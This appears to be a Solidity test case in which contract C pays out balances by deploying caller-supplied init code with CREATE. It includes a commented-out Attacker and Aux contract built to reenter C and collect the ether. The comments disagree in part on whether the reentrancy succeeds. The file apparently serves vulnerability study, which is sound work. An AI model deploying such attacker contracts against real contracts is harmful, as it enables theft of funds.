pragma solidity ^0.8.0;

// SPDX-License-Identifier: GPL-3.0
contract C {
    mapping (address => uint256) public balances;


    function deploy_and_transfer(bytes memory initCode) public {
        uint amt = balances[msg.sender];
        require(amt > 0, "Insufficient funds");      

        balances[msg.sender] = 0;    // side effect BEFORE constructor call prevents reentrancy

        // the following assembly block is equivalent to the classic external call
        // (bool success, ) = msg.sender.call{value: amt}("");
		address addr;
        assembly {
            addr := create(amt, add(initCode, 0x20), mload(initCode))   // this instantiates a new contract using the initCode argument as custom constructor code
            if iszero(addr) {
                revert(0, 0)
            }
        }

    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
}

// the whole mechanism relies on the CREATE instructions allowing a custom code to be executed as constructor when a contract is instantiated and deployed
// the Attacker contract below reenters the victim contract C above and forces it to create a new instance of Aux at each invocation
// the money transferred to each new instance is eventually sent and accumulated by the Attacker contract

// contract Attacker {
//     bytes private create_aux_initcode;
//     address private victim;
//     constructor(bytes memory _create_aux_initcode, address _victim) {    // the first argument represents the (byte-encoded) code of the constructor of the Aux contract
//         create_aux_initcode = _create_aux_initcode;
//         victim = _victim;
//     }
//     function attack() public {
//         C(victim).deposit{value: 1000}();
//         C(victim).deploy_and_transfer(create_aux_initcode);
//     }
//     receive() external payable {
//         C(victim).deploy_and_transfer(create_aux_initcode);
//     }
// }

// contract Aux {
//     constructor(address payable attacker) payable {
//         attacker.transfer(msg.value);
//     }
// }
